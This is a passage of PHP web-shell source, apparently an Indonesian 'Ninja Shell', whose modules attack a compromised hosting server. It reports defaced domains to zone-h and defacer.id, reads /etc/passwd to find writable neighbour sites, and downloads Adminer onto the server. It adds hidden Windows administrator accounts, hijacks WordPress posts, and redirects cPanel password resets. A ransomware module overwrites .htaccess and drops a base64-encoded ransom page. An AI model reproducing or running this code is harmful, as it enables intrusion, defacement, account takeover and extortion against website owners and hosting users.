    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("cp-crack") . '><center>Cpanel Crack</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("smtp-grab") . '><center>SMTP Grabber</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("domains") . '><center>Domains Viewer</center></a></td>
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("whmcs-decoder") . '><center>WHMCS Decoder</center></a></td>	
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("delete-logs") . '><center>Delete Logs</center></a></td>
</tr>
</table>
<br><hr>';
		} elseif (isset($_GET[hex('zone-h')])) {
			?>
				<form action="" method="post">
					<center>
						<hr><br>
						<h2>Zone H Submit Ninja Shell</h2>
						<u>Defacer :</u>
						<input type="text" name="defacer" style="width: 250px; height: 30px;" value="Your Zone-h Name" class="form-control" />
						<br>
						<u>Attacks Method :</u>
						<select name="hackmode" class="form-control" style="width: 250px; height: 40px;">
							<option>--------SELECT--------</option>
							<option value="1">known vulnerability (i.e. unpatched system)</option>
							<option value="2">undisclosed (new) vulnerability</option>
							<option value="3">configuration / admin. mistake</option>
							<option value="4">brute force attack</option>
							<option value="5">social engineering</option>
							<option value="6">Web Server intrusion</option>
							<option value="7">Web Server external module intrusion</option>
							<option value="8">Mail Server intrusion</option>
							<option value="9">FTP Server intrusion</option>
							<option value="10">SSH Server intrusion</option>
							<option value="11">Telnet Server intrusion</option>
							<option value="12">RPC Server intrusion</option>
							<option value="13">Shares misconfiguration</option>
							<option value="14">Other Server intrusion</option>
							<option value="15">SQL Injection</option>
							<option value="16">URL Poisoning</option>
							<option value="17">File Inclusion</option>
							<option value="18">Other Web Application bug</option>
							<option value="19">Remote administrative panel access bruteforcing</option>
							<option value="20">Remote administrative panel access password guessing</option>
							<option value="21">Remote administrative panel access social engineering</option>
							<option value="22">Attack against administrator(password stealing/sniffing)</option>
							<option value="23">Access credentials through Man In the Middle attack</option>
							<option value="24">Remote service password guessing</option>
							<option value="25">Remote service password bruteforce</option>
							<option value="26">Rerouting after attacking the Firewall</option>
							<option value="27">Rerouting after attacking the Router</option>
							<option value="28">DNS attack through social engineering</option>
							<option value="29">DNS attack through cache poisoning</option>
							<option value="30">Not available</option>
						</select>
						<br>
						<u>Reasons :</u>
						<select name="reason" class="form-control" style="width: 250px; height: 40px;">
							<option style='display:block;width:100%;'>--------SELECT--------</option>
							<option value="1">Heh...just for fun!</option>
							<option value="2">Revenge against that website</option>
							<option value="3">Political reasons</option>
							<option value="4">As a challenge</option>
							<option value="5">I just want to be the best defacer</option>
							<option value="6">Patriotism</option>
							<option value="7">Not available</option>
						</select>
						<br>
						<textarea class="form-control" name="domain" style='display:block;width:25%;height:150px;'>List Of Domains</textarea>
						<p>(1 Domain Per Lines)</p>
						<input type="submit" class="form-control" style="width: 250px; height: 40px;" value="Send Now !" name="SendNowToZoneH" />
				</form>
				</center>
				<hr><br><span style="color:red">
					<?php
					function ZoneH($url, $hacker, $hackmode, $reson, $site)
					{
						$k = curl_init();
						curl_setopt($k, CURLOPT_URL, $url);
						curl_setopt($k, CURLOPT_POST, true);
						curl_setopt($k, CURLOPT_POSTFIELDS, "defacer=" . $hacker . "&domain1=" . $site . "&hackmode=" . $hackmode . "&reason=" . $reson);
						curl_setopt($k, CURLOPT_FOLLOWLOCATION, true);
						curl_setopt($k, CURLOPT_RETURNTRANSFER, true);
						$kubra = curl_exec($k);
						curl_close($k);
						return $kubra;
					}

					if (isset($_POST['SendNowToZoneH'])) {
						ob_start();
						$sub = @get_loaded_extensions();
						if (!in_array("curl", $sub)) {
							die('[-] Curl Is Not Supported !! ');
						}

						$hacker = $_POST['defacer'];
						$method = $_POST['hackmode'];
						$neden = $_POST['reason'];
						$site = $_POST['domain'];

						if ($hacker == "Your Zone-h Name") {
							die("[-] You Must Fill the Attacker name !");
						} elseif ($method == "--------SELECT--------") {
							die("[-] You Must Select The Method !");
						} elseif ($neden == "--------SELECT--------") {
							die("[-] You Must Select The Reason");
						} elseif (empty($site)) {
							die("[-] You Must Inter the Sites List ! ");
						}
						$i = 0;
						$sites = explode("\n", $site);
						while ($i < count($sites)) {
							if (substr($sites[$i], 0, 4) != "http") {
								$sites[$i] = "http://" . $sites[$i];
							}
							ZoneH("http://zone-h.org/notify/single", $hacker, $method, $neden, $sites[$i]);
							echo "Site : " . $sites[$i] . " Defaced !<br>";
							++$i;
						}
						echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !!";
					}
					?>
				</span>
			<?php
		} elseif (isset($_GET[hex('defacer-id')])) {

			echo "<hr><br><center>
		<h2>Defacer ID Submit Ninja Shell</h2>
		<form method='post'>
		<u>Defacer</u>: <br>
		<input class = 'form-control' style='width:250px; height:40px;' type='text' name='hekel' size='50' value='./Exorcism1337'><br>
		<u>Team</u>: <br>
		<input class = 'form-control' style='width:250px; height:40px;' type='text' name='tim' size='50' value='Index Attacker'><br>
		<u>Domains</u>: <br>
		<textarea class = 'form-control' style='width: 450px; height: 150px;' name='sites'></textarea><br>
		<input  class = 'form-control' style='width:250px; height:40px; 'type='submit' name='go' value='Submit'>
		</form><hr><br>";
			$site = explode("\r\n", $_POST['sites']);
			$go = $_POST['go'];
			$hekel = $_POST['hekel'];
			$tim = $_POST['tim'];
			if ($go) {
				foreach ($site as $sites) {
					$zh = $sites;
					$form_url = "https://www.defacer.id/notify";
					$data_to_post = array();
					$data_to_post['attacker'] = "$hekel";
					$data_to_post['team'] = "$tim";
					$data_to_post['poc'] = 'SQL Injection';
					$data_to_post['url'] = "$zh";
					$curl = curl_init();
					curl_setopt($curl, CURLOPT_URL, $form_url);
					curl_setopt($curl, CURLOPT_POST, sizeof($data_to_post));
					curl_setopt($curl, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"); //msnbot/1.0 (+http://search.msn.com/msnbot.htm)
					curl_setopt($curl, CURLOPT_POSTFIELDS, $data_to_post);
					curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
					curl_setopt($curl, CURLOPT_REFERER, 'https://defacer.id/notify.html');
					$result = curl_exec($curl);
					echo $result;
					curl_close($curl);
					echo "<br>";
				}
			}
		} elseif (isset($_GET[hex('jumping')])) {

			echo "<hr><br><center><h2>Jumping Ninja Shell</h2>";
			echo "<form method = 'POST' action = ''>";
			echo "<input type = 'submit' name = 'jump' class='form-control' style='width:250px;height:40px;' value = 'Jump!'> ";
			echo "<hr><br></center>";

			if (isset($_POST['jump'])) {

				$i = 0;
				echo "<pre><div class='margin: 5px auto;'>";
				$etc = fopen("/etc/passwd", "r") or die("<font color=red>Can't read /etc/passwd</font>");
				while ($passwd = fgets($etc)) {
					if ($passwd == '' || !$etc) {
						echo "<font color=red>Can't read /etc/passwd</font>";
					} else {
						preg_match_all('/(.*?):x:/', $passwd, $user_jumping);
						foreach ($user_jumping[1] as $user_Exc_jump) {
							$user_jumping_dir = "/home/$user_Exc_jump/public_html";
							if (is_readable($user_jumping_dir)) {
								$i++;
								$jrw = "[<font color=lime>R</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
								if (is_writable($user_jumping_dir)) {
									$jrw = "[<font color=lime>RW</font>] <a href='?dir=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
								}
								echo $jrw;
								if (function_exists('posix_getpwuid')) {
									$domain_jump = file_get_contents("/etc/named.conf");
									if ($domain_jump == '') {
										echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
									} else {
										preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
										foreach ($domains_jump[1] as $dj) {
											$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
											$user_jumping_url = $user_jumping_url['name'];
											if ($user_jumping_url == $user_Exc_jump) {
												echo " => ( <u>$dj</u> )<br>";
												break;
											}
										}
									}
								} else {
									echo "<br>";
								}
							}
						}
					}
				}
				if ($i == 0) {
				} else {
					echo "<br>Total ada " . $i . " Kamar di " . gethostbyname($_SERVER['HTTP_HOST']) . "";
				}
				echo "</div></pre>";
			}
		} elseif (isset($_GET[hex('fake-root')])) {

			ob_start();
			if (!preg_match("#/home/$user/public_html#", $_SERVER['DOCUMENT_ROOT'])) die("I Think this server is not using shared host ");
			function reverse($url)
			{
				$ch = curl_init("http://domains.yougetsignal.com/domains.php");
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_POSTFIELDS,  "remoteAddress=$url&ket=");
				curl_setopt($ch, CURLOPT_HEADER, 0);
				curl_setopt($ch, CURLOPT_POST, 1);
				$resp = curl_exec($ch);
				$resp = str_replace("[", "", str_replace("]", "", str_replace("\"\"", "", str_replace(", ,", ",", str_replace("{", "", str_replace("{", "", str_replace("}", "", str_replace(", ", ",", str_replace(", ", ",",  str_replace("'", "", str_replace("'", "", str_replace(":", ",", str_replace('"', '', $resp)))))))))))));
				$array = explode(",,", $resp);
				unset($array[0]);
				foreach ($array as $lnk) {
					$lnk = "http://$lnk";
					$lnk = str_replace(",", "", $lnk);
					echo $lnk . "\n";
					ob_flush();
					flush();
				}
				curl_close($ch);
			}
			function cek($url)
			{
				$ch = curl_init($url);
				curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
				curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
				$resp = curl_exec($ch);
				return $resp;
			}
			$cwd = getcwd();
			$ambil_user = explode("/", $cwd);
			$user = $ambil_user[2];
			if ($_POST['reverse']) {
				$site = explode("\r\n", $_POST['url']);
				$file = $_POST['file'];
				foreach ($site as $url) {
					$cek = cek("$url/~$user/$file");
					if (preg_match("/hacked/i", $cek)) {
						echo "URL: <a href='$url/~$user/$file' target='_blank'>$url/~$user/$file</a> -> <font color=lime>Fake Root!</font><br>";
					}
				}
			} else {
				echo "<hr><br><center><h2>Fake Root Ninja Shell</h2><form method='post'>
		Filename: <br><input class='form-control' type='text' name='file' value='deface.html' style='width:300px;height:40px;'><br>
		User: <br><input class='form-control' type='text' value='$user' size='50' height='10' readonly style='width:300px;height:40px;'><br>
		Domain: <br>
		<textarea class='form-control' style='width: 450px; height: 250px;' name='url'>";
				reverse($_SERVER['HTTP_HOST']);
				echo "</textarea><br>
		<input class='form-control' type='submit' name='reverse' value='Scan Fake Root!' style='width: 450px;'>
		</form><br>
		NB: Sebelum gunain Tools ini , upload dulu file deface kalian di dir /home/user/ dan /home/user/public_html.</center><hr><br>";
			}
		} elseif (isset($_GET[hex('adminer')])) {

			echo "<hr><br>";
			echo "<center><h2>Adminer Ninja Shell</h2>";
			echo "<input type='submit' class='form-control' value='Spawn Adminer' style='width:250px;height:40px;' name='do_adminer'></center>";
			echo "<hr><br>";

			if (isset($_POST['do_adminer'])) {

				$full = str_replace($_SERVER['DOCUMENT_ROOT'], "", $dir);
				function adminer($url, $isi)
				{
					$fp = fopen($isi, "w");
					$ch = curl_init();
					curl_setopt($ch, CURLOPT_URL, $url);
					curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
					curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
					curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
					curl_setopt($ch, CURLOPT_FILE, $fp);
					return curl_exec($ch);
					curl_close($ch);
					fclose($fp);
					ob_flush();
					flush();
				}
				if (file_exists('adminer.php')) {
					echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
				} else {
					if (adminer("https://www.adminer.org/static/download/4.2.4/adminer-4.2.4.php", "adminer.php")) {
						echo "<center><font color=lime><a href='$full/adminer.php' target='_blank'>-> adminer login <-</a></font></center>";
					} else {
						echo "<center><font color=red>gagal buat file adminer</font></center>";
					}
				}
			}
		} elseif (isset($_GET[hex('rdp')])) {
			if (strtolower(substr(PHP_OS, 0, 3)) === 'win') {
				if ($_POST['create']) {
					$user = htmlspecialchars($_POST['user']);
					$pass = htmlspecialchars($_POST['pass']);
					if (preg_match("/$user/", exe("net user"))) {
						echo "[INFO] -> <font color=red>user <font color=lime>$user</font> sudah ada</font>";
					} else {
						$add_user   = exe("net user $user $pass /add");
						$add_groups1 = exe("net localgroup Administrators $user /add");
						$add_groups2 = exe("net localgroup Administrator $user /add");
						$add_groups3 = exe("net localgroup Administrateur $user /add");
						echo "[ RDP ACCOUNT INFO ]<br>
                ------------------------------<br>
                IP: <font color=lime>" . gethostbyname($_SERVER['HTTP_HOST']) . "</font><br>
                Username: <font color=lime>$user</font><br>
                Password: <font color=lime>$pass</font><br>
                ------------------------------<br><br>
                [ STATUS ]<br>
                ------------------------------<br>
                ";
						if ($add_user) {
							echo "[add user] -> <font color='lime'>Berhasil</font><br>";
						} else {
							echo "[add user] -> <font color='red'>Gagal</font><br>";
						}
						if ($add_groups1) {
							echo "[add localgroup Administrators] -> <font color='lime'>Berhasil</font><br>";
						} elseif ($add_groups2) {
							echo "[add localgroup Administrator] -> <font color='lime'>Berhasil</font><br>";
						} elseif ($add_groups3) {
							echo "[add localgroup Administrateur] -> <font color='lime'>Berhasil</font><br>";
						} else {
							echo "[add localgroup] -> <font color='red'>Gagal</font><br>";
						}
						echo "------------------------------<br>";
					}
				} elseif ($_POST['s_opsi']) {
					$user = htmlspecialchars($_POST['r_user']);
					if ($_POST['opsi'] == '1') {
						$cek = exe("net user $user");
						echo "Checking username <font color=lime>$user</font> ....... ";
						if (preg_match("/$user/", $cek)) {
							echo "[ <font color=lime>Sudah ada</font> ]<br>
                    ------------------------------<br><br>
                    <pre>$cek</pre>";
						} else {
							echo "[ <font color=red>belum ada</font> ]";
						}
					} elseif ($_POST['opsi'] == '2') {
						$cek = exe("net user $user Exorcism1337");
						if (preg_match("/$user/", exe("net user"))) {
							echo "[change password: <font color=lime>Exorcism1337</font>] -> ";
							if ($cek) {
								echo "<font color=lime>Berhasil</font>";
							} else {
								echo "<font color=red>Gagal</font>";
							}
						} else {
							echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
						}
					} elseif ($_POST['opsi'] == '3') {
						$cek = exe("net user $user /DELETE");
						if (preg_match("/$user/", exe("net user"))) {
							echo "[remove user: <font color=lime>$user</font>] -> ";
							if ($cek) {
								echo "<font color=lime>Berhasil</font>";
							} else {
								echo "<font color=red>Gagal</font>";
							}
						} else {
							echo "[INFO] -> <font color=red>user <font color=lime>$user</font> belum ada</font>";
						}
					} else {
						//
					}
				} else {
					echo "<hr><br><center>";
					echo "<h2>RDP Ninja Shell</h2>";
					echo "-- Create RDP --<br>
            <form method='post'>
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <u>Username:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='user' placeholder='username' value='Exorcism1337' required>
            </div>
            <div class = 'col-md-4'>
             <u>Password:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='pass' placeholder='password' value='Exorcism1337' required>
            </div>
            <div class = 'col-md-4'>
            <u>Button:</u>
            <input class ='form-control' style = 'width:250px;height:40px;' type='submit' name='create' value='Gass'>
            </div>
            </div>
            </form><br>
            -- Option --<br>
            <form method='post'>
            <div class = 'row clearfix'>
            <div class = 'col-md-4'>
            <input class ='form-control' style = 'width:250px;height:40px;' type='text' name='r_user' placeholder='username' required>
            </div>
            <div class = 'col-md-4'>
            <select name='opsi' class ='form-control' style = 'width:250px;height:40px;'>
            <option value='1'>Cek Username</option>
            <option value='2'>Ubah Password</option>
            <option value='3'>Hapus Username</option>
            </select>
            </div>
            <div class = 'col-md-4'>
            <input type='submit' name='s_opsi' value='Cek' class ='form-control' style = 'width:250px;height:40px;'>
            </div>
            </div>
            </form><hr><br>
            ";
				}
			} else {
				echo "<font color=red>Fitur ini hanya dapat digunakan dalam Windows Server.</font>";
			}
		} elseif (isset($_GET[hex('wp-hijack')])) {

			echo '<form method="POST">
<center><hr><br>			
<img border="0" src="http://www3.0zz0.com/2014/08/20/15/615506358.png">
<h2>Wordpress Hijack Index Ninja Shell</h2><br>
<center>
<div class = "row clearfix ml-5">
<div class= "col-md-2">
<input class="form-control" type="text" value="localhost" name="pghost">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="database_name" name="dbnmn">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="prefix" name="prefix">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="username_db" name="dbusrrrr">
</div>
<div class= "col-md-2">
<input class="form-control" type="text" value="password_db" name="pwddbbn"></center><br>
</div>
</div>
<center><textarea class="form-control" name="pown" cols="85" rows="10"><meta http-equiv="refresh" content="0;URL=http://pastebin.com/raw.php?i=WG1zASMG"></textarea><br>
<input style="width:250px;height:40px;" class="form-control" type="submit" name="up2" value="Hijack Index"><br></center><form><hr><br>';
			$pghost = $_POST['pghost'];
			$dbnmn = $_POST['dbnmn'];
			$dbusrrrr = $_POST['dbusrrrr'];
			$pwddbbn = $_POST['pwddbbn'];
			$index = stripslashes($_POST['pown']);
			$prefix = $_POST['prefix'];
			//$prefix = "wp_";
			if ($_POST['up2']) {
				@mysql_connect($pghost, $dbusrrrr, $pwddbbn) or die(mysql_error());
				@mysql_select_db($dbnmn) or die(mysql_error());
				$tableName = $prefix . "posts";
				$ghost1 = mysql_query("UPDATE $tableName SET post_title ='" . $index . "' WHERE ID > 0 ");
				if (!$ghost1) {
					$ghost2 = mysql_query("UPDATE $tableName SET post_content ='" . $index . "' WHERE ID > 0 ");
				} elseif (!$ghost2) {
					$ghost3 = mysql_query("UPDATE $tableName SET post_name ='" . $index . "' WHERE ID > 0 ");
				}
				mysql_close();
				if ($ghost1 || $ghost2 || $ghost3) {
					echo "<center><p><b><font color='red'>Index Website Have been Hijacked Successfully</font></p></b></center>";
				} else {
					echo "<center><p><b><font color='red'>Failed To Hijack the Website :(</font></p></b></center>";
				}
			}
		} elseif (isset($_GET[hex('cpanel-reset')])) {

			echo '
		<hr><br>
         <center>
         <h2>Cpanel Reset Ninja Shell</h2>
         <br><br>
         
  	
  	    <form action="" method="post">
  	    <b> Email : </b>
  	<input type="email" name="email" class = "form-control" style = "width:250px; height:40px;" autocomplete="off"  />
  	<br>
  	<input type="submit" name="submit" value="Reset Password!" class = "form-control" style = "width:250px; height:40px;" />

  	</form>
  	<br>
  	</div>
  	     </center>
  	     <hr><br>
     ';
			$user = get_current_user();
			$site = $_SERVER['HTTP_HOST'];
			$ips = getenv('REMOTE_ADDR');

			if (isset($_POST['submit'])) {

				$email = $_POST['email'];
				$wr = 'email:' . $email;
				$f = fopen('/home/' . $user . '/.cpanel/contactinfo', 'w');
				fwrite($f, $wr);
				fclose($f);
				$f = fopen('/home/' . $user . '/.contactinfo', 'w');
				fwrite($f, $wr);
				fclose($f);
				$parm = "Disini : " . $site . ':2083/resetpass?start=1';
				echo '<br/><center>' . $parm . '</center>';
			};
		} elseif (isset($_GET[hex('zip-menu')])) {

			$dir = path();
			echo "<center>";
			echo "<hr><br>";
			echo "<h2>Zip Menu</h2>";
			function rmdir_recursive($dir)
			{
				foreach (scandir($dir) as $file) {
					if ('.' === $file || '..' === $file) continue;
					if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
					else unlink("$dir/$file");
				}
				rmdir($dir);
			}
			if ($_FILES["zip_file"]["name"]) {
				$filename = $_FILES["zip_file"]["name"];
				$source = $_FILES["zip_file"]["tmp_name"];
				$type = $_FILES["zip_file"]["type"];
				$name = explode(".", $filename);
				$accepted_types = array('application/zip', 'application/x-zip-compressed', 'multipart/x-zip', 'application/x-compressed');
				foreach ($accepted_types as $mime_type) {
					if ($mime_type == $type) {
						$okay = true;
						break;
					}
				}
				$continue = strtolower($name[1]) == 'zip' ? true : false;
				if (!$continue) {
					$message = "Itu Bukan Zip  , , GOBLOK COK";
				}
				$path = dirname(__FILE__) . '/';
				$filenoext = basename($filename, '.zip');
				$filenoext = basename($filenoext, '.ZIP');
				$targetdir = $path . $filenoext;
				$targetzip = $path . $filename;
				if (is_dir($targetdir)) rmdir_recursive($targetdir);
				mkdir($targetdir, 0777);
				if (move_uploaded_file($source, $targetzip)) {
					$zip = new ZipArchive();
					$x = $zip->open($targetzip);
					if ($x === true) {
						$zip->extractTo($targetdir);
						$zip->close();
						unlink($targetzip);
					}
					$message = "<b>Sukses Cok :)</b>";
				} else {
					$message = "<b>Error Jancok :(</b>";
				}
			}
			echo '<table style="width:100%" border="1">
<form enctype="multipart/form-data" method="post" action="">
<label>Zip File : <input type="file" class="form-control" name="zip_file" /></label>
<input type="submit" class="form-control" style="width:250px;" name="submit" value="Upload And Unzip" />
</form><br><br>';
			if ($message) echo "<p>$message</p>";
			echo "<h2>Zip Backup</h2>
<form action='' method='post'><font style='text-decoration: underline;'>Folder:</font><br>
<input class='form-control' type='text' name='dir' value='$dir' style='width: 450px;' height='10'><br><br>
<font style='text-decoration: underline;'>Save To:</font><br>
<input class='form-control' type='text' name='save' value='$dir/Exorcism_backup.zip' style='width: 450px;' height='10'><br><br>
<input class='form-control' type='submit' name='backup' class='kotak' value='Back Up!' style='width: 215px;'></form><br><br>";
			if ($_POST['backup']) {
				$save = $_POST['save'];
				function Zip($source, $destination)
				{
					if (extension_loaded('zip') === true) {
						if (file_exists($source) === true) {
							$zip = new ZipArchive();
							if ($zip->open($destination, ZIPARCHIVE::CREATE) === true) {
								$source = realpath($source);
								if (is_dir($source) === true) {
									$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source), RecursiveIteratorIterator::SELF_FIRST);
									foreach ($files as $file) {
										$file = realpath($file);
										if (is_dir($file) === true) {
											$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
										} else if (is_file($file) === true) {
											$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
										}
									}
								} else if (is_file($source) === true) {
									$zip->addFromString(basename($source), file_get_contents($source));
								}
							}
							return $zip->close();
						}
					}
					return false;
				}
				Zip($_POST['dir'], $save);
				echo "Selesai , Save To <b>$save</b>";
			}
			echo "
        <h2>Unzip Manual</h2>
    <form action='' method='post'><font style='text-decoration: underline;'>Zip Location:</font><br>
    <input class='form-control' type='text' name='dir' value='$dir/file.zip' style='width: 450px;' height='10'><br><br>
    <font style='text-decoration: underline;'>Save To:</font><br>
    <input class='form-control' type='text' name='save' value='$dir/Exorcism_unzip' style='width: 450px;' height='10'><br><br>
    <input class='form-control' type='submit' name='extrak' class='kotak' value='Unzip!' style='width: 215px;'></form><br><br>
    ";
			if ($_POST['extrak']) {
				$save = $_POST['save'];
				$zip = new ZipArchive;
				$res = $zip->open($_POST['dir']);
				if ($res === TRUE) {
					$zip->extractTo($save);
					$zip->close();
					echo 'Succes , Location : <b>' . $save . '</b>';
				} else {
					echo 'Gagal Cok :( Ntahlah !';
				}
			}
			echo '</table><hr>';
		} elseif (isset($_GET[hex('reverse-ip')])) {

			?>
				<br>
				<hr>
				<center>
					<h2>Reverse IP Ninja Shell</h2>
					<a style="width: 250px;" class="form-control" onClick="window.open('http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER['SERVER_ADDR']; ?>','POPUP','width=900 0,height=500,scrollbars=10');return false;" href="http://www.viewdns.info/reverseip/?host=<?php echo $_SERVER['SERVER_ADDR']; ?>">[ Reverse IP Lookup ] </a>
				</center>
				<br>
				<hr>
			<?php
		} elseif (isset($_GET[hex('ransomware')])) {
			if (version_compare(PHP_VERSION, '7.2.0', '>')) {

				echo '<br><br><font color = red>Tools Ransomware Ini Hanya bisa berjalan di PHP versi 7.2 ke bawah saja . untuk PHP versi 7.2 ke atas masih proses pembuatan </font> ';
				exit;
			}

			?>
				<br>
				<hr>
				<html>

				<head>
					<link rel="icon" type="image/gif" href="https://s-media-cache-ak0.pinimg.com/236x/a7/76/ec/a776ec52e575d0473d33557aa610e47d--skull-fashion-flower-tattoos.jpg">
					<link href='http://fonts.googleapis.com/css?family=Iceland' rel='stylesheet' type='text/css'>
					<title> &#1203;&#824;&#1202;&#824;&#1203; Exorcism Tr0jan Ransomware &#1203;&#824;&#1202;&#824;&#1203;</title>
					<style type="text/css">
						.inpute {
							width: 500px;
							height: 20px;
							border-color: #EA2A14;
							color: lime;
							text-align: center;
						}

						.selecte {
							border-color: lime;
							width: 300px;
							height: 30px;
							background-color: transparent;
							color: lime;
						}

						.submite {
							width: 200px;
							border-color: #EA2A14;
							background-color: transparent;
							color: red;
						}

						.item {
							background-color: black;
						}
					</style>
				</head>

				<body>
					<?php
					error_reporting(0);
					set_time_limit(0);
					ini_set('memory_limit', '-1');
					class deRanSomeware
					{
						public function shcpackInstall()
						{
							if (!file_exists(".htaencrypted")) {
								rename(".htaccess", ".htaencrypted");
								if (fwrite(fopen('.htaccess', 'w'), "#Exorcism Ransomware\r\nDirectoryIndex virus.php\r\nErrorDocument 404 /virus.php")) {
									echo '<i class="fa fa-thumbs-o-up" aria-hidden="true"></i> .htaccess (Default Page)<br>';
								}
								if (file_put_contents("virus.php", base64_decode("PGh0bWw+DQo8Ym9keT4NCjxoZWFkPg0KDQo8dGl0bGU+RW5jcnlwdGVkITwvdGl0bGU+DQoNCjwvaGVhZD4NCjxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UvZ2lmIiBocmVmPSJodHRwczovL3MtbWVkaWEtY2FjaGUtYWswLnBpbmltZy5jb20vMjM2eC9hNy83Ni9lYy9hNzc2ZWM1MmU1NzVkMDQ3M2QzMzU1N2FhNjEwZTQ3ZC0tc2t1bGwtZmFzaGlvbi1mbG93ZXItdGF0dG9vcy5qcGciPg0KPGJvZHkgYmdjb2xvciA9ICdibGFjayc+DQo8Y2VudGVyPg0KDQo8c3R5bGUgdHlwZT0ndGV4dC9jc3MnPmJvZHksIGEsIGE6bGlua3tjdXJzb3I6dXJsKGh0dHA6Ly80LmJwLmJsb2dzcG90LmNvbS8taEFGN3RQVW5tRUUvVHdHUjNsUkgwRUkvQUFBQUFBQUFBczgvNnBraTIyaGMzTkUvczE2MDAvYXNzLnBuZyksIGRlZmF1bHQ7fSBhOmhvdmVyIHtjdXJzb3I6dXJsKGh0dHA6Ly8zLmJwLmJsb2dzcG90LmNvbS8tYlJpa2dxZVp4MFEvVHdHUjRNVUVDN0kvQUFBQUFBQUFBdEEvaXNKbVMwcjM1UXcvczE2MDAvcG9pbnRlci5wbmcpLHdhaXQ7fTwvc3R5bGU+DQo8cHJlIHN0eWxlPSJmb250OiAxMnB4LzEycHggbW9ub3NwYWNlOyI+PGZvbnQgY29sb3IgPSAncmVkJz4NCnV1dXV1dXUNCnV1JCQkJCQkJCQkJCR1dQ0KdXUkJCQkJCQkJCQkJCQkJCQkJHV1DQp1JCQkJCQkJCQkJCQkJCQkJCQkJCQkdQ0KdSQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkdQ0KdSQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJCR1DQp1JCQkJCQkJCQkJCQkJCQkJCQkJCQkJCQkJHUNCnUkJCQkJCQiICAgIiQkJCIgICAiJCQkJCQkdQ0KIiQkJCQiICAgICAgdSR1ICAgICAgICQkJCQiDQokJCR1ICAgICAgIHUkdSAgICAgICB1JCQkDQokJCR1ICAgICAgdSQkJHUgICAgICB1JCQkDQoiJCQkJHV1JCQkICAgJCQkdXUkJCQkIg0KIiQkJCQkJCQiICAgIiQkJCQkJCQiDQp1JCQkJCQkJHUkJCQkJCQkdQ0KdSQiJCIkIiQiJCIkIiR1DQp1dXUgICAgICAgICQkdSQgJCAkICQgJHUkJCAgICAgICB1dXUNCnUkJCQkICAgICAgICAkJCQkJHUkdSR1JCQkICAgICAgIHUkJCQkDQogJCQkJCR1dSAgICAgICIkJCQkJCQkJCQiICAgICB1dSQkJCQkJA0KIHUkJCQkJCQkJCQkJHV1ICAgICIiIiIiICAgIHV1dXUkJCQkJCQkJCQkDQogICAkJCQkIiIiJCQkJCQkJCQkJHV1dSAgIHV1JCQkJCQkJCQkIiIiJCQkIg0KIiIiICAgICAgIiIkJCQkJCQkJCQkJHV1ICIiJCIiIiAgICAgDQogICAgdXV1dSAiIiQkJCQkJCQkJCR1dXUNCiAgICB1JCQkdXV1JCQkJCQkJCQkdXUgIiIkJCQkJCQkJCQkJHV1dSQkJA0KICAgICAkJCQkJCQkJCQkIiIiIiAgICAgICAgICAgIiIkJCQkJCQkJCQkJCINCiAgICAgICIkJCQkJCIgICAgICAgICAgICAgICAgICAgICAgIiIkJCQkIiINCiAgICAgICAkJCQiICAgICAgICAgICAgICAgICAgICAgICAgICQkJCQiDQo8L3ByZT48L2ZvbnQ+DQo8bGluayBocmVmPSdodHRwOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1JY2VsYW5kJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4NCjxmb250IGZhY2U9ImljZWxhbmQiIHNpemU9IjEwIiBjb2xvciA9ICdyZWQnPllvdXIgV2Vic2l0ZSBIYXZlIEJlZW4gRW5jcnlwdGVkISA8YnI+DQo8Zm9udCBzaXplID0gJzYnPkJ5IDxicj5FeG9yY2lzbSAmIFNlY3VyaXR5X0h1bnRlcno8L2ZvbnQ+PGJyPjwvZm9udD48YnI+DQo8Zm9udCBmYWNlID0gJ2ljZWxhbmQnIHNpemUgPSAnNicgY29sb3IgPSAnd2hpdGUnPldoYXQgSGFwcGVuZWQgVG8gWW91ciBXZWJzaXRlPyANCgkJPGJyPjxicj4gDQoJCTxmb250IHNpemU9JzUnIGNvbG9yID0gJ3JlZCc+WW91ciBpbXBvcnRhbnQgd2Vic2l0ZSBmaWxlcyBhcmUgZW5jcnlwdGVkLjxicj4NCgkJPGZvbnQgY29sb3